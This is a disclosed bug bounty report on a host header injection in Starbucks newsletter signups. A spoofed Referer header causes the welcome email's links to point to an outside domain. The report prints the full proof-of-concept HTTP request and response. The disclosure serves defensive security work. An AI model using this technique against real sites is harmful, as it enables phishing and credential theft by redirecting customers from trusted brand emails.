# Host header injection/redirection via newsletter signup

## Report Details
- **Report ID**: 229498
- **URL**: https://hackerone.com/reports/229498
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-18T03:18:51.822Z
- **Disclosed**: 2018-06-08T22:21:15.338Z

## Reporter
- **Username**: b3nac
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Good evening,

There's a host header injection vulnerability via all newsletter signups in the referrer attribute. This works with all pages that have "Join our email list" signup boxes.

####Since the referrer attribute can be changed to an outside domain the email being received redirects all links within the "Welcome to Starbucks" email. So in result the member is redirected to a malicious site from the email they used.

The Starbucks logo redirects to the referrer url. I can make another directory for the other links to redirect perfectly with the session cookie name. 

###POC:

I sent this post request to a test email:
```
Host: rewards.www.starbucks.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://r1otnetsec.herokuapp.com/
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: ███████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```
Post body:
```
newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer
```
The resulting response:
```
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/7.5
p3p: CP="CAO PSA OUR"
Set-Cookie: ASP.NET_SessionId=███████; domain=.starbucks.com; path=/; secure; HttpOnly
x-newrelic-app-data: PxQGUlZUDQIJR1NRBAEEVVUDFB9AMQYAZBBZDEtZV0ZaCldOfDdwTSFmdA4IF0pcXAgEEBhhRQkHVEVAJAkRDxJOCEwIFAQcA1EKVgVTBE5UGhVUUlQOBwMgJVQEcwZTIHUUHwQHDxFVPw==
X-Powered-By: ASP.NET
x-frame-options: SAMEORIGIN
Date: Thu, 18 May 2017 02:53:52 GMT
Content-Length: 457
Via: 1.1 sjc1-10
newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer
```
###The referrer attritube is encoded and sent to the victims email.

###As a result my url https://r1otnetsec.herokuapp.com/ is sent in place of the normal starbucks url. Clicking the image url sends the user to the malicious page.

Please refer to the screenshots of the email links being changed. This makes it very easy to steal customer credentials by redirect. 

I look forward to hearing from you and have a good evening!

## Attachments
- PostRequest200okStarbucksHeaderinjection.PNG
- StarbucksVerifyEmailAddressPOCImageLink.png
